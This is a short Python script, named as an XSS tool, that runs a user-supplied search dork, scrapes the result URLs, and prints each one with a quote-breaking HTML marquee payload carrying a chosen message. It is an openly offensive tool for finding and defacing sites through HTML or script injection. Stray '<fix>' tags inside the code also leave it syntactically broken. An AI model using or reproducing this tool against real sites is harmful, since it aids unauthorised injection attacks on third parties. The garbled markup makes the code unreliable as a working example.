import urllib3 as url
from bs4 import BeautifulSoup
import requests

class Xss:
    def main():
        user_dork = str(input("[Input Dork] >_ "))
        req = url.PoolManager()
        <fix/>send = req.request("GET", "http://www1.search-results.com/web?q=" + user_dork)
        parser = BeautifulSoup(send.data, features="html.parser")
        x = str(input("[Message] >_ "))
        print("[+] Here's the result ! \n")
        print("-----------------------------------------")</fix>
        for link in parser.find_all('cite'):
            result = link.string
            <fix/>print("[+] > " + str(result) + "'" + "<marquee style='background:red'>" + x + "</marquee>")

        print("-----------------------------------------")</fix>
